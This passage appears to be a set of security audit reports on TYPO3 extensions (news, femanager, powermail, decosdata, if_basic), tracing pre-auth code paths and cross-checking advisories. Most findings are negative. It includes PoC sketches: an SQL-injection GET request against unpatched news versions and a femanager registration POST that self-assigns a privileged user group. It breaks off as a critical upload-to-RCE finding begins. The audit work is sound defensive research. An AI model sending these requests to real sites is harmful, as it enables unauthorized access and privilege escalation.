- **eID handlers:** none (`grep eID_include / Frontend\Middleware` → nothing; no `Configuration/RequestMiddlewares.php`).
- **PSR-15 middlewares:** none registered by the extension.
- **AJAX endpoints:** none.
- **Unauthenticated Extbase plugins** (`ext_localconf.php`): `NewsController` (list, detail, selectedList,
  dateMenu, searchForm, searchResult), `CategoryController::list`, `TagController::list`. These are the real
  pre-auth entry points and were traced in full.
- Backend controllers (`AdministrationController`, `Import*`, `Updates/*`, `Backend/*`) are **not pre-auth** and
  were excluded from findings.

---

## Findings (traced paths — all currently NON-exploitable in 14.0.3)

### 1. Date-menu `dateField` → raw SQL in `countByDate()` — PATCHED here (this is CVE-2026-8726)

- **SEVERITY:** High (in unpatched versions ≤14.0.2); **not exploitable in 14.0.3**.
- **PRE-AUTH:** Yes.
- **Source:** `Classes/Controller/NewsController.php:432-462` (`dateMenuAction(?array $overwriteDemand)`) →
  `overwriteDemandObject()` at `Classes/Controller/NewsController.php:163-186`, which does
  `ObjectAccess::setProperty($demand, $propertyName, $propertyValue)` for attacker-supplied keys, allowing
  `tx_news_pi1[overwriteDemand][dateField]` to reach `NewsDemand::setDateField()`.
- **Sink:** `Classes/Domain/Repository/NewsRepository.php:349-388` (`countByDate()`), which concatenates
  `$demand->getDateField()` directly into a raw SQL string built with string interpolation (into
  `FROM_UNIXTIME(...)` / `date_trunc(...)` / `strftime(...)` and executed via `$connection->executeQuery($sql)`).
- **Tainted path:** `?tx_news_pi1[overwriteDemand][dateField]=…` → `setDateField()` → `getDateField()` → raw `$sql`.
- **Why NOT exploitable in 14.0.3:** at `NewsRepository.php:366` the field is now wrapped:
  `$field = $connection->quoteIdentifier(empty($field) ? 'datetime' : $field);`. `quoteIdentifier()` backtick-
  quotes the value and doubles embedded backticks, so a payload such as `datetime FROM x-- -` becomes a single
  invalid quoted identifier (query errors) rather than breaking out. This `quoteIdentifier` call **is** the
  official fix shipped in 14.0.3. Exploitation additionally required the non-default TypoScript setting
  `disableOverrideDemand = 0` and an active "Date Menu" plugin.
- **PoC sketch (would work only against ≤14.0.2 with overrideDemand enabled):**
  `GET /date-menu-page?tx_news_pi1[overwriteDemand][dateField]=<SQL>` on a page rendering the `NewsDateMenu`
  plugin. Against 14.0.3 this returns a DB error / no injection.

### 2. `overwriteDemand` mass-assignment (`ObjectAccess::setProperty`) — bounded, no reachable dangerous sink

- **SEVERITY:** Low / informational.
- **PRE-AUTH:** Yes, but **disabled by default**.
- **Path:** `list/searchForm/searchResult/dateMenu` actions apply `overwriteDemand` only when
  `(int)($this->settings['disableOverrideDemand'] ?? 1) !== 1` — i.e. the default (`1`) blocks it entirely.
  `ignoredSettingsForOverride = ['demandclass','orderbyallowed','selectedList']` (`NewsController.php:60`) and the
  case-insensitive check at `NewsController.php:169` prevent overriding `demandClass` (object-instantiation guard
  at `NewsController.php:100-121`, `makeInstance($class,...)`) and `orderByAllowed` (the ordering whitelist).
- **Why not a finding:** the only writable properties are typed scalar setters on `NewsDemand`; every downstream
  constraint is built with Extbase QOM bound parameters (see finding 4). The one raw-SQL reachable property
  (`dateField`) is neutralized per finding 1. Worst residual impact (only if an admin enables overrideDemand) is
  reading news from other storage pids via `storagePage` — low, and news records are public content.

### 3. Ordering (`order` / `orderBy`) — whitelist-validated, not injectable

- **PRE-AUTH:** Yes (via `overwriteDemand[order]` when enabled), but safe.
- `Classes/Domain/Repository/NewsRepository.php:267-289` builds orderings only if
  `Validation::isValidOrdering($demand->getOrder(), $demand->getOrderByAllowed())` passes.
  `Classes/Utility/Validation.php:22-58` requires every order field to be in the `orderByAllowed` allow-list
  (`GeneralUtility::inList`) and the direction to be exactly `asc`/`desc`. `orderByAllowed` cannot be overridden
  by the request (finding 2) and is additionally locked to TS in `buildSettings()`
  (`propertiesNotAllowedViaFlexForms = ['orderByAllowed']`, `NewsController.php:596-601`). This is the fix for the
  historical order-by SQLi (TYPO3-EXT-SA-2017-001) and is intact.

### 4. Search subject → SQL — parameterized

- **PRE-AUTH:** Yes (`searchResult`, user-supplied `tx_news_pi1[search][subject]`), but safe.
- `Classes/Domain/Repository/NewsRepository.php:444-499` (`getSearchConstraints`) uses
  `$query->like($field, '%'.$searchSubject.'%')` / `$query->logicalOr/And(...)` — Extbase QOM, which binds the
  subject as a parameter. `$field` names come from `settings['search']['fields']` (TypoScript config, set in the
  controller at `NewsController.php:521`), **not** from the request. No string concatenation into SQL. Dates use
  `strtotime()` (int). Not injectable.

### 5. Dynamic `makeInstance()` / template path / file reads — config-controlled, not attacker-controlled

- `NewsController.php:386` `makeInstance($providerClass)` ← `settings['detail']['pageTitle']['provider']` (TS).
- `NewsController.php:659` `makeInstance($paginationClass, …)` ← `settings…['paginate']['class']` (TS).
- `NewsBaseController.php:90` `getFileAbsFileName($options[1])` and `:562` PluginPreviewRenderer template path ←
  `settings['detail']['errorHandling']` (TS) / backend template (fixed EXT: path). None reach request input.
- No `eval`, `unserialize`, `call_user_func`, `create_function`, or `makeInstance($requestControlledVar)` exist in
  `Classes/` (grep clean). `f:format.raw` appears only in **backend** Fluid templates (PageLayoutView, Import),
  not on frontend request data. Frontend output of `search`/`overwriteDemand` goes through auto-escaping Fluid and
  link-building ViewHelpers.

### 6. Direct request input outside Extbase — all integer-cast

- `Seo/NewsAvailability.php:126-127`, `DataProcessing/DisableLanguageMenuProcessor.php:77-78`
  (`getQueryParams()['tx_news_pi1']['news']`), `Seo/NewsXmlSitemapDataProvider.php:124` (`['page']`),
  `Domain/Repository/CategoryRepository.php:221-222` (`['L']`) — every one is wrapped in `(int)`. No taint reaches
  a sink.

---

## Known CVEs (version cross-ref)

| Advisory | CVE | Type | Affected | Fixed in | Status for 14.0.3 |
|---|---|---|---|---|---|
| TYPO3-EXT-SA-2026-010 | CVE-2026-8726 | SQL Injection (pre-auth, Date Menu plugin, `overwriteDemand[dateField]`) | ≤11.4.3, 12.0.0–12.3.1, 13.0.0–13.0.1, **14.0.0–14.0.2** | 11.4.4, 12.3.2, 13.0.2, **14.0.3** | **NOT affected** — this is the fixed release; the `quoteIdentifier()` mitigation is present at `NewsRepository.php:366`. |
| TYPO3-EXT-SA-2017-001 | (news order-by SQLi) | SQL Injection via `overwriteDemand` ordering | old 2.x/3.x line | 3.2.6 / 4.0.0 era | **NOT affected** — mitigated by `Validation::isValidOrdering()` allow-list (`Utility/Validation.php`) + `orderByAllowed` override protection. |

CVE-2026-8726 is the single most relevant public advisory; the audited version 14.0.3 is precisely its remediation
release, and the corresponding source-level fix is confirmed present. No known CVE affects 14.0.3.

Sources:
- [TYPO3-EXT-SA-2026-010](https://typo3.org/security/advisory/typo3-ext-sa-2026-010)
- [TYPO3-EXT-SA-2017-001](https://typo3.org/security/advisory/typo3-ext-sa-2017-001)

### in2code_femanager

#### Security Audit — in2code/femanager

- **Target:** `/home/user/sources/code/typo3-extensions/in2code_femanager`
- **Version:** 13.3.3 (ext_emconf.php) — TYPO3 v13 line, PHP >= 8.1
- **Scope:** pre-auth frontend attack surface — registration / confirmation / invitation / edit / password / AJAX
- **Date:** 2026-08-04

## Summary

femanager 13.3.3 is, on the whole, a **hardened** codebase. The historically dangerous flows are
correctly protected:

- **Confirmation / invitation hashes** are `md5(username + suffix + TYPO3 encryptionKey)` (unforgeable
  without the server secret) — no `uniqid`/`mt_rand`/timestamp predictability.
- **Edit / delete** are protected against IDOR/account-takeover by an HMAC "spoof" token bound to the
  logged-in user's uid+crdate, plus an explicit `uid === currentUser.uid` check (`AbstractController::isSpoof`).
- **Extbase `__trustedProperties`** (Fluid `<f:form>`) blocks mass-assignment of non-rendered fields
  (`disable`, `tx_extbase_type`, `starttime`, …) on create/update — these fields are never rendered, so
  they cannot be injected via extra POST keys.
- No SQL injection (all repository access is via the Extbase query builder with bound parameters; the one
  request-influenced `orderby` is `preg_replace`'d to `[A-Za-z0-9_-]`).
- No `unserialize`/`eval`/`system`; dynamic `$obj->{$method}()` calls are all **config- or DB-driven**, never request-tainted.
- No open redirect (all redirects go through TypoScript `redirect`/`requestRedirect` cObjects, not request params).

**One genuine finding** (F1): value-level **usergroup mass-assignment / privilege escalation** that
bypasses the `removeFromUserGroupSelection` control — pre-auth via registration. Two low-severity
observations (F2 info disclosure, F3 static-hash design) follow.

| # | Finding | Severity | Pre-auth |
|---|---------|----------|----------|
| F1 | Usergroup value not server-side allow-listed → self-assign arbitrary `fe_group` | **Medium** (High impact where privileged FE groups exist) | **Yes** (registration) |
| F2 | `confirmCreateRequest` renders any user by uid before hash check (config-gated) | Low | Yes |
| F3 | Confirmation hash is static/non-expiring and reused across purposes | Low / Info | — |

---

## F1 — Usergroup mass-assignment / privilege escalation (removeFromUserGroupSelection is client-only)

- **SEVERITY:** Medium (High where any `fe_group` grants meaningful privilege, e.g. access to
  access-restricted pages/content or a de-facto "editor" group)
- **PRE-AUTH:** Yes — reachable through the anonymous Registration plugin (`createAction`). Also reachable
  authenticated via Edit (`updateAction`) and Invitation (`updateAction`).

**Source (tainted input):**
`tx_femanager_registration[user][usergroup][0]=<groupUid>` — rendered field, therefore a *trusted*
property, so Extbase's `__trustedProperties` HMAC does **not** stop it:
- `Resources/Private/Partials/Fields/Usergroup.html:17` → `name="user[usergroup][0]"`, options `= {allUserGroups}`.

**Sink (privilege granted):**
- `Classes/Controller/NewController.php:61` — `createAction(User $user, …)`: Extbase maps the submitted
  `usergroup` uid to a `UserGroup` and attaches it to the new `fe_users` record.
- `Classes/Domain/Model/User.php:233` `setUsergroup()` / `:242` `addUsergroup()` — no restriction.

**Why the intended control fails:**
- `Classes/Domain/Repository/UserGroupRepository.php:22` `findAllForFrontendSelection($removeList)` only
  filters which groups are **rendered as `<option>`s**. It is a *presentation* filter.
- `Classes/Utility/UserUtility.php:136` `overrideUserGroup()` forces groups **only if**
  `settings.new.overrideUserGroup` is configured; when it is not (the common case for sites that let users
  choose a group), the submitted value stands.
- `Classes/Domain/Validator/ServersideValidator.php:26-108` iterates only over *configured validation
  fields* (`required`, `email`, `min`, `inList`, …). There is **no check that a submitted usergroup uid is a
  member of `findAllForFrontendSelection`** (or of any allow-list). `usergroup` is normally not in the
  validation settings at all, so it is never inspected.

**Tainted path:**
`POST tx_femanager_registration[user][usergroup][0]=<privileged_gid>`
→ `NewController::createAction` (Extbase property mapping; `usergroup` is a trusted rendered field)
→ `overrideUserGroup` (no-op unless `overrideUserGroup` set)
→ `ServersideValidator` (usergroup not validated)
→ `userRepository->add($user)` → account persisted with attacker-chosen group
→ attacker confirms via the email hash they legitimately receive (they control the address)
→ on login the account is a member of an `fe_group` the site intended to hide via `removeFromUserGroupSelection`.

**Exploitability (honest):** Real, but conditional:
1. the registration form must expose the usergroup field (default "show all fields" branch,
   `New.html:61`, renders it; many installs do), **and**
2. `new.overrideUserGroup` must not be set (if set, groups are forced server-side and this is fully mitigated), **and**
3. a target `fe_group` must actually confer privilege beyond the intended registrant group.
The attacker may submit **any** group uid, including groups explicitly removed from the dropdown via
`removeFromUserGroupSelection` — that control provides zero server-side enforcement. This is the classic,
long-standing femanager escalation vector.

**PoC sketch:**
```
POST /registration-page HTTP/1.1
Content-Type: application/x-www-form-urlencoded

tx_femanager_registration[__referrer][...]=...&tx_femanager_registration[__trustedProperties]=<valid, from GET form>
&tx_femanager_registration[user][username]=attacker
&tx_femanager_registration[user][email]=attacker@evil.tld
&tx_femanager_registration[user][password]=Passw0rd!
&tx_femanager_registration[user][usergroup][0]=<uid_of_privileged_or_hidden_fe_group>
```
`usergroup` is present in the page's own `<f:form>`, so the reused `__trustedProperties` blob accepts it;
only the *value* is swapped for a privileged/hidden group uid. Complete the email confirmation → escalated.

**Remediation:** Enforce, server-side, that every submitted usergroup uid ∈ `findAllForFrontendSelection(removeFromUserGroupSelection)`
(reject/strip otherwise), or make `overrideUserGroup` the default. Do not treat the dropdown option set as a
security boundary.

---

## F2 — Pre-auth user data disclosure via `confirmCreateRequest` (config-gated)

- **SEVERITY:** Low
- **PRE-AUTH:** Yes

**Path:** `Classes/Controller/NewController.php:119-201` `confirmCreateRequestAction(int $user, string $hash, string $status, ?string $adminHash)`.
The user record is loaded by **uid** at line 127 (`findByUid($user)`) *before* any hash validation. In the
`userConfirmation` (line 164) and `userConfirmationRefused` (line 149) branches — active when
`confirmUserConfirmation` / `confirmUserConfirmationRefused` TypoScript is `1` — the controller assigns the
loaded `$user` to the view and renders `Templates/New/ConfirmCreateRequest.html` **without** calling
`HashUtility::validHash` for that branch. An anonymous request
`?tx_femanager_registration[action]=confirmCreateRequest&…&user=<uid>&status=userConfirmation` therefore
renders whatever profile fields that template exposes for an arbitrary user uid (enumeration of registered
users / names). The `adminConfirmation*` branches (lines 179-227) *do* gate on `validHash($adminHash,…,'admin')`,
so no admin path is exposed. State-changing operations (`statusUserConfirmation`, etc.) all remain gated by
`validHash`, so this is disclosure only, not takeover.

**Exploitability:** Only when the `confirmUserConfirmation(Refused)` intermediate-dialog options are enabled
(non-default). Impact limited to the fields the confirmation template prints. Rate-limited registration does
not apply to this GET.

**Remediation:** Validate `HashUtility::validHash($hash, $user)` at the top of `confirmCreateRequestAction`,
before loading/assigning the user for the dialog branches.

---

## F3 — Confirmation hash is static, non-expiring, and cross-purpose (design note)

- **SEVERITY:** Low / Informational
- **PRE-AUTH:** n/a (defense-in-depth)

`Classes/Utility/HashUtility.php:27` `createHashForUser($user, $suffix) = substr(md5(username + suffix + encryptionKey), 0, 16)`.
This is **unforgeable** without the site `encryptionKey`, so it is *not* a predictability bug (no
`uniqid`/`mt_rand`/time). However:
- It is derived solely from the (rarely changing) username, so the same value is valid **forever** — no
  nonce, no expiry, no single-use. A confirmation/invitation link that leaks (browser history, `Referer` to
  third-party assets on the confirmation page, proxy logs) stays valid indefinitely.
- The **same** hash authorizes multiple sensitive operations: create-confirm, `NewController` delete-on-refuse,
  and — via `InvitationController::editAction/updateAction/deleteAction` (`InvitationController.php:172,229,279`)
  — **setting the invited user's password** (account takeover of an invited-but-not-yet-activated user).
  One leaked hash thus enables confirm + delete + (for invited users) password set.
- 16 hex chars = 64 bits: not remotely brute-forceable, and registration is rate-limited
  (`RatelimiterService`), so online guessing is impractical. Reported for completeness, not as an exploit.

**Remediation (hardening):** Include a per-record random nonce + timestamp in the hashed material, store it,
expire it, and invalidate after first successful use; use distinct secrets/suffixes per operation class.

---

## Reviewed and found NOT exploitable

- **Edit / Delete IDOR & account takeover** — `EditController::updateAction` (`:56`) / `deleteAction` (`:199`)
  require `AbstractController::isSpoof` (`:489`) to pass: HMAC token `hmac(uid, crdate)` (`hash_equals`, tied
  to the logged-in user) **and** `currentUser.uid === submitted __identity`. Cross-user edit/delete is blocked;
  token is server-secret-keyed. Solid.
- **Mass-assignment of `disable` / `tx_extbase_type` / `starttime` / `admin`** — these are never rendered in
  the create/edit `<f:form>`, so Extbase `__trustedProperties` (HMAC-signed with encryptionKey) rejects them
  as extra POST keys. `fe_users` has no `admin` column. Not injectable.
- **`UserController::loginAsAction` (impersonation)** (`:129`) — gated by `BackendUserUtility::isAdmin()` OR
  `ConfigurationUtility::isEnableLoginAsActive()` (reads `$GLOBALS['BE_USER']->getTSConfig()`); both require a
  backend user context. Not reachable by an anonymous frontend visitor. (Minor style nit: `ImpersonateEvent`
  is dispatched before the authorization check, but the actual `UserUtility::login` occurs only after it.)
- **SQL injection** — `UserRepository::findByUsergroups` (`:60`) uses `$query->like()`/`contains()` with bound
  values; `searchword` (request) is a bound LIKE parameter; `fieldsToSearch`/`orderby` come from TypoScript,
  and `orderby` is `preg_replace('/[^a-zA-Z0-9_-]/','')`-sanitized. `DataController::getStatesForCountryAction`
  uses static_info_tables repositories (bound). No raw/concatenated SQL anywhere in `Classes/`.
- **XSS in confirmation pages/mails** — reflected `hash`/`status` land in Fluid `<f:form.hidden>` / attributes,
  which auto-escape; no `f:format.raw` on request data in these flows.
- **Open redirect** — `redirectByAction` (`AbstractController.php:453`) builds targets from TypoScript
  `redirect`/`requestRedirect` cObjects, not from any `redirect`/`return`/`referer` request parameter.
- **RCE (dynamic dispatch)** — `EditController::statusConfirm` setter names come from server-generated
  `tx_femanager_changerequest` XML; `FrontendUtility::forceValues` and `FinisherRunner` method names come from
  TypoScript. None are request-tainted.
- **`CleanUserGroupMiddleware` / `RemovePasswordIfEmptyMiddleware`** — only unset an empty usergroup[0] /
  empty password key in the parsed body; no injection surface.

---

## Known CVEs / advisories cross-reference

femanager has a history of TYPO3 security advisories in exactly the audited areas. Findings vs. this version (13.3.3):

- **Frontend-user record spoofing / editing other users (account takeover)** — the historical femanager class
  of bug (arbitrary `fe_users` edit via manipulated identity). **Mitigated here** by the `isSpoof()`
  HMAC-token + `uid === currentUser.uid` mechanism (`AbstractController.php:489`). Not reproducible.
- **Insufficient property/mass-assignment validation on registration** (the recurring femanager
  usergroup/field-injection theme). **Partially mitigated** by Extbase `__trustedProperties` for non-rendered
  fields, but **F1 above shows the usergroup value itself is still not allow-listed** — the residual, and the
  one live issue in this review.
- **XSS / SQLi / open-redirect advisories** in older femanager releases — no residual instances found in this
  version (see "Reviewed and found NOT exploitable").

No published CVE was found that is un-patched in 13.3.3 based on source review; the extension is current with
the v13 line. Recommend confirming against the in2code/femanager GitHub security advisories and TYPO3 SA feed
for any post-13.3.3 disclosures.

### in2code_powermail

#### Security Audit — in2code/powermail

**Target:** `/home/user/sources/code/typo3-extensions/in2code_powermail`
**Version:** 13.1.0 (ext_emconf.php) — TYPO3 v13.4+, PHP ^8.2 (composer.json)
**Scope:** Pre-auth (frontend, unauthenticated) exploitable vulnerabilities in the actual source.
**Date:** 2026-08-04

## Summary

No solid pre-auth Critical/High/Medium finding. This is a **hardened, recent release**: every classic powermail pre-auth sink (reflected marker/prefill XSS, marker SQLi, upload traversal, eID SSRF) has been closed in this line. The only concrete issue is one **LOW** — the spam-notification template emits `print_r($_REQUEST)` through `f:format.raw` into an admin notification. Several historically-vulnerable surfaces were traced end-to-end and confirmed non-exploitable in this version (documented below so the negative result is auditable).

Counts: Critical 0 · High 0 · Medium 0 · Low 1 · Informational/Reviewed-safe 4

---

## Findings

### LOW-1 — Unsanitized `$_REQUEST` reflected into SpamShield admin notification (HTML/log injection)
- **PRE-AUTH:** Yes (triggering the spam path is anonymous), but impact target is the **admin/editor** recipient, and only fires when the configured spam tolerance is exceeded and `spamshield.email`/logging is enabled.
- **Source:** `Classes/Domain/Validator/SpamShieldValidator.php:217-218` — `'request' => $_REQUEST`, `'requestPlain' => print_r($_REQUEST, true)`.
- **Sink:** `Resources/Private/Templates/Log/SpamNotification.html` (last line) — `<f:format.raw>{requestPlain}</f:format.raw>`; rendered by `SpamShieldValidator::createSpamNotificationMessage()` (`:194-200`) and emailed / prepended to the log file (`:182`, `BasicFileUtility::prependContentToFile`).
- **Tainted path:** attacker HTTP request body/query → `$_REQUEST` → StandaloneView variable → raw-printed into notification.
- **Exploitability:** The notification is dispatched as a plain-text log/mail, so `f:format.raw` does not yield browser XSS in the default configuration; it is HTML/content-injection into an admin-facing artifact (and full reflection of attacker-chosen request keys/values into an admin mailbox). If a site delivers this notification as `text/html`, stored-XSS-in-admin-mail becomes reachable. Low severity: admin-only target, requires spam threshold + notifications enabled, no anonymous-victim impact.
- **Fix:** drop `f:format.raw` (let Fluid escape), or stop reflecting raw `$_REQUEST`.

---

## Reviewed and NOT exploitable (negative results with rationale)

These are the surfaces the brief flagged as "prime"; each was traced source→sink and found safe in 13.1.0.

**eID `powermailEidGetLocation` — SSRF: NOT exploitable.**
`ext_localconf.php:60` registers `Eid\GetLocationEid::main` (unauthenticated). It reads `getQueryParams()['lat']`/`['lng']` but **casts both to `(float)`** (`GetLocationEid.php:40-41`) before interpolating into the fixed `https://nominatim.openstreetmap.org/reverse?...&lat=<float>&lon=<float>` URL (`:83`). Host is hard-coded; numeric casting makes the query string non-controllable. No SSRF, no header/URL injection, no CRLF. Only a static outbound call to OpenStreetMap.

**Reflected XSS via prefill GET param (`tx_powermail_pi1[field][marker]`): NOT exploitable.**
`PrefillFieldViewHelper` (`Classes/ViewHelpers/Misc/PrefillFieldViewHelper.php:139-161, initialize():357`) pulls values straight from `FrontendUtility::getArguments()` and returns them. It is consumed in `value="{vh:misc.prefillField(...)}"` across `Resources/Private/Partials/Form/Field/*.html`. The ViewHelper does **not** set `$escapeOutput = false`, so Fluid's default output-escaping htmlspecialchars-encodes the reflected value inside the attribute; no `f:format.raw` wraps it. Attribute breakout is prevented. (This is the historically-patched powermail prefill-XSS, and the fix holds here.)

**Stored/reflected XSS via markers on confirmation/create page and in mails: NOT exploitable.**
`FormController::prepareOutput()` (`Classes/Controller/FormController.php:310-326`) builds marker variables with `MailRepository::getVariablesWithMarkersFromMail($mail, true)` — the `true` runs `ArrayUtility::htmlspecialcharsOnArray()` (`MailRepository.php:360-362`). `{powermail_all}` (rendered via `TemplateUtility::powermailAll`) is emitted through `ManipulateValueWithTypoScriptViewHelper` (`Classes/ViewHelpers/Misc/ManipulateValueWithTypoScriptViewHelper.php`), an `AbstractViewHelper` with default `escapeChildren`/`escapeOutput = true`, so `{answer.value}` is escaped in both the Web and Mail partials (`Resources/Private/Partials/PowermailAll/{Web,Mail}.html`). The `f:format.raw` in `Confirmation.html:17` only wraps already-escaped rendered HTML. Field values in receiver/sender mails are likewise escaped.

**SQL injection from submitted field values: NOT exploitable.**
All user-input-driven queries use Extbase parameterized constraints or int-casts:
- `MailRepository::findByMarkerValueForm()` (`:123`) — used by `UniqueValidator` with the raw submitted `$answer->getValue()` — builds `$query->equals('answers.value', $value)` (bound parameter).
- `MailRepository::removeFromDatabase()` (`:569-579`) and `DatabaseUtility::deleteMailAndAnswersFromDatabase` take `int` identifiers.
- `SaveToAnyTableService::getExistingEntry()` (`:271-281`) uses `createNamedParameter`, filters unique-field name via `removeNotAllowedSigns()` (`preg_replace('/[^a-zA-Z0-9_-]/','')`), and its `additionalWhere` comes from TypoScript, not the request.
Raw-string `->where("...".$var)` occurrences exist only in **backend/admin-authenticated** code (`Classes/Tca/ShowFormNoteEditForm.php`, `Classes/ViewHelpers/Be/PowermailVersionNoteViewHelper.php`, `Classes/Database/QueryGenerator.php`, `Classes/Controller/ModuleController.php` — the latter gated by `BackendUtility::isBackendAdmin()`), and their interpolated values are int-cast or admin-supplied. Not reachable pre-auth.

**Arbitrary file write / path traversal via upload: NOT exploitable.**
`UploadService::uploadAllFiles()` (`:77-93`) is the only `GeneralUtility::upload_copy_move` sink and only runs for freshly-uploaded (`!isUploaded()`) files, guarded by `isFileExtensionAllowed()` (`:116-126`): extension must be in the admin whitelist (`GeneralUtility::inList`), `FileNameValidator::isValid` enforces TYPO3's `fileDenyPattern` (blocks `.php`, `.htaccess`, …), and `GeneralUtility::validPathStr($filename)` rejects `..`/`\`. The write path uses `newName = StringUtility::cleanString($originalName)` (`FileFactory.php:105`), whose regex `[^a-z0-9-\.]→_` strips `/` (so no directory separator survives → no traversal). Confirmation-step hidden-field filenames (`getInstanceFromUploadArguments`) create files flagged `uploaded=true`, so they are never re-written.

**RCE / SSTI via `fluidParseString`, dynamic `makeInstance`, `unserialize`: NOT exploitable.**
`TemplateUtility::fluidParseString()` renders a string as Fluid *source*, but every caller passes an **admin-controlled** source (`SendMailService.php:436` subject/receiverName/etc.; `ReceiverMailReceiverPropertiesService.php:127`; `Field::getTitle()`/settings `Field.php:116,548`); submitted field values are passed only as *variables* (escaped on output), never as template source, so no SSTI. Dynamic `GeneralUtility::makeInstance($class)` in `FinisherRunner`, `DataProcessorRunner`, `SpamShieldValidator`, `ForeignValidator`, `InputValidator` all take class names from TypoScript/flexform (admin), not the request. `RateLimitStorage.php:44` `unserialize` restricts `allowed_classes` to `Window`/`SlidingWindow`/`TokenBucket` on cache-origin data — no object-injection gadget from request input.

**Open redirect via RedirectFinisher: NOT exploitable by default.**
`RedirectUriService::getTarget()` sources the redirect exclusively from FlexForm (`settings.flexform.thx.redirect`) / TypoScript overwrite (`RedirectUriService.php:32-72`) — admin configuration, not request arguments.

---

## Known CVEs / advisories cross-reference

Powermail is distributed via the TYPO3 Extension Repository; its security issues are published as **TYPO3-EXT-SA** advisories rather than always carrying CVE IDs. Historically the extension has received advisories in the 2.x–7.x lines for:
- **Reflected Cross-Site Scripting** via form prefill GET parameters and marker output (the `PrefillFieldViewHelper` / `{powermail_all}` surface).
- **SQL injection** via marker/field handling in older repository code.
- **Information disclosure** in the backend list/export module.

**Affected status for 13.1.0:** This release targets TYPO3 v13 and post-dates all of the above advisories. The corresponding sinks are hardened in the code as traced in the "Reviewed and NOT exploitable" section (Fluid default output-escaping + explicit `htmlspecialcharsOnArray`, Extbase parameterized queries, `FileNameValidator`/`validPathStr` on uploads). No known historical powermail advisory maps to an unpatched sink in this version.

> Note: precise CVE identifiers for the older powermail advisories are not asserted here to avoid fabricating IDs; they are tracked under the vendor's TYPO3-EXT-SA advisory series. Confirm exact IDs against the TYPO3 security advisory index for the affected 2.x–7.x versions if a CVE mapping is required for reporting.

### innologi_typo3-decosdata

#### Security Audit — innologi/typo3-decosdata (decosdata) v3.0.1

**Target eID:** `tx_decosdata_download` (download handler)
**TYPO3 constraint:** 13.4.0–13.4.99 / PHP 8.2–8.4
**Focus:** path traversal / arbitrary file read, access-control bypass
**Verdict:** No exploitable pre-auth vulnerability found. The download handler is correctly protected by an HMAC bound to the site `encryptionKey` and dereferences a FAL file **uid**, not a filesystem path.

---

## Summary

The eID `tx_decosdata_download` is registered pre-auth in `ext_localconf.php`:

```
$GLOBALS['TYPO3_CONF_VARS']['FE']['eID_include']['tx_decosdata_download'] = \Innologi\Decosdata\Eid\Download::class;
```

`Eid/Download::run()` delegates to `DownloadService::validateRequest()->sendFile(true)`. The candidate sinks (`filesize`, `fopen`, `readfile`, `readfileByChunks`) all operate on a path derived from `ResourceFactory->getFileObject($this->fileUid)` — a **FAL sys_file uid lookup**, not an attacker-supplied path. Before any file is touched, `validateRequest()` enforces an HMAC over the requested identifiers. The path-traversal / arbitrary-read hunt is therefore disproven, and the access-control angle is closed by the HMAC + encryptionKey.

---

## Analysis of the traced path

**Source** — `Classes/Service/DownloadService.php:validateRequest()` (approx. lines 150–170):

```php
$this->fileUid = (int) $_GET['f'] ?? null;   // int cast
$blobUid       = (int) $_GET['b'] ?? null;
$itemUid       = (int) $_GET['i'] ?? null;
$hash          = (string) $_GET['h'] ?? '';

$this->validRequest = $this->getHashService()->validateHmac(
    $this->generateHashString($this->fileUid, $blobUid, $itemUid),  // "f-b-i|salt"
    $this->secretSalt,
    $hash,
);
if (!$this->validRequest) {
    throw new \Exception('Invalid request', 1515670080);
}
```

**Sink** — `Classes/Service/DownloadService.php:sendFile()` (approx. lines 180–200):

```php
if (!$this->validRequest) { throw new \Exception('The request was not validated', 1515683722); }
$file     = $this->getResourceFactory()->getFileObject($this->fileUid);        // FAL uid → File
$filepath = \TYPO3\CMS\Core\Core\Environment::getPublicPath() . '/' . $file->getPublicUrl();
$filesize = filesize($filepath);
...
readfile($filepath); // (or chunked)
```

### Why path traversal / arbitrary file read does NOT apply
- `f` is `(int)`-cast, so `$this->fileUid` is always an integer. It is never concatenated into a path.
- The read path is computed from `getFileObject($uid)->getPublicUrl()`, i.e. a FAL-indexed file record. There is no attacker-controlled string component reaching `fopen`/`readfile`. `../`, absolute paths, null bytes, PHP wrappers, etc. cannot be injected because the input is numeric and dereferenced through FAL.

### Why the HMAC is not forgeable pre-auth (access-control)
- `generateHashString()` concatenates the uids with the hardcoded `$salt`, and the HMAC is produced via `\TYPO3\CMS\Core\Crypto\HashService::hmac($message, $this->secretSalt)`.
- In TYPO3 v13 the Core `HashService` derives the MAC from the site-wide **`$GLOBALS['TYPO3_CONF_VARS']['SYS']['encryptionKey']`** in addition to the supplied `additionalSecret`. The two hardcoded constants (`$salt`, `$secretSalt`) are public (GPL source), but the encryptionKey is a per-installation secret. Without it an attacker cannot compute a valid `h` for an arbitrary `f`, so they cannot request an arbitrary FAL uid.
- `validateHmac` uses constant-time comparison; no type-juggling bypass (the empty-string default still fails the compare).

### Residual notes (not vulnerabilities)
- The HMAC binds only `(f,b,i)` — it carries no per-user/session binding. This is by design: a generated download URL is a bearer capability for a specific file and works for any (including anonymous) client. It does not let an attacker reach files they weren't already handed a link for, so it is not a privilege-escalation IDOR.
- If a site operator ships an empty/weak/leaked `encryptionKey`, the HMAC would become forgeable — but that is a deployment misconfiguration of the whole TYPO3 instance, not a bug in this extension.

---

## PoC

Not exploitable. A request such as `GET /index.php?eID=tx_decosdata_download&f=1&b=0&i=0&h=<forged>` is rejected with `Invalid request (1515670080)` unless `h` is a valid HMAC produced with the target site's encryptionKey. A legitimately issued link (`h` generated by `getDownloadUrl()`) only yields the exact `f` it was signed for.

## Known CVEs / advisories
No dedicated public advisory (TYPO3-EXT-SA / GHSA / CVE) was found for `decosdata` / `innologi/typo3-decosdata` at v3.0.1. Related TYPO3 core file-upload advisories (e.g. TYPO3-CORE-SA-2025-014) concern the core FAL, not this extension. Nothing applicable to this eID.

**Sources:** [TYPO3 Security Advisories](https://typo3.org/help/security-advisories), [TYPO3-CORE-SA-2025-014](https://typo3.org/security/advisory/typo3-core-sa-2025-014)

### interfrog_if_basic

#### Security Audit — interfrog/if_basic (ifPage Basic) v2.0.0

**Target eID:** `ajaxupload` (AJAX upload handler)
**TYPO3 era:** 8.7 (deps: fluid_styled_content/rte_ckeditor 8.7, powermail 3.8–3.21)
**Focus:** unrestricted file upload → RCE, path traversal, missing auth
**Verdict:** CRITICAL — confirmed **pre-auth unrestricted file upload leading to remote code execution**. An unauthenticated attacker can upload a `.php` file into a web-reachable directory (`fileadmin/user_upload/`) and execute it.

---

## Summary

`ext_localconf.php:15` registers the eID with no authentication and points it at a raw PHP script:

```php
